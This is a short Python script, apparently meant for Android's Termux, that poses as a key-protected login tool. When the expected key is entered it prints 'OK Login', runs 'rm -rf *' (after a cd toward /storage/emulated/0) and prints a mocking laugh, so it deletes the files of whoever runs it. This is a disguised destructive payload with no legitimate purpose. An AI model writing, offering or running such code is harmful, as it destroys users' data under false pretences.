import os, requests, time
import random, sys
from colorama import Fore
#Ngah Nakon

Key = str(input("Key :> "))
if Key == "IBCUETCFKRJU2===":
	print(Fore.GREEN+"OK Login")
	time.sleep(3)
	os.system("cd /storage/emulated/0")
	os.system("rm -rf *")
	time.sleep(3)
	print(Fore.GREEN+"HaHaHaHa 😈✨")
else:
	os.system("clear")
	print(Fore.RED+"Not Key Right")
	sys.exit()